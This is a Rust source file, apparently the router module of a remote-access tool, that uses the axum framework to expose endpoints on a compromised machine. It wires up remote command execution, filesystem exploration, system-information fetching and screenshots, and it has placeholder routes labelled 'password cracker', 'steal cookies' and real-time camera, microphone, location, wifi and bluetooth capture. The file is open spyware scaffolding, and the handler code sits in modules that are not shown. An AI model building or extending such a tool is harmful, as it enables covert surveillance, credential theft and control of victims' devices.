mod exec;
mod fetch;
mod fsxp;
mod scrn;

use crate::ShellState;
use axum::{
    routing::{get, post},
    Extension, Router,
};
use std::sync::{Arc, Mutex};

pub fn all_routes(shellstate: Arc<Mutex<ShellState>>) -> Router {
    Router::new()
        .route("/", get("login with username and password"))
        .route("/set", get("update username & password"))
        .route("/pswd", post("password cracker"))
        .route("/exec", post(exec::exec_cmd))
        .route("/fsxp", post(fsxp::scout_path))
        // routes for easier access
        .route("/cookie", post("steal cookies"))
        .route("/fetch", post(fetch::fetch_sys_info))
        // routes for real time data
        .route("/skrin", post(scrn::screenshot))
        .route("/kamera", post("real time camera"))
        .route("/spikar", post("real time speaker"))
        .route("/maik", post("real time mic"))
        .route("/lokesan", post("real time location"))
        .route("/oaifai", post("real time wifi"))
        .route("/blootooth", post("real time bluetooth"))
        // extensions
        .layer(Extension(shellstate))
}
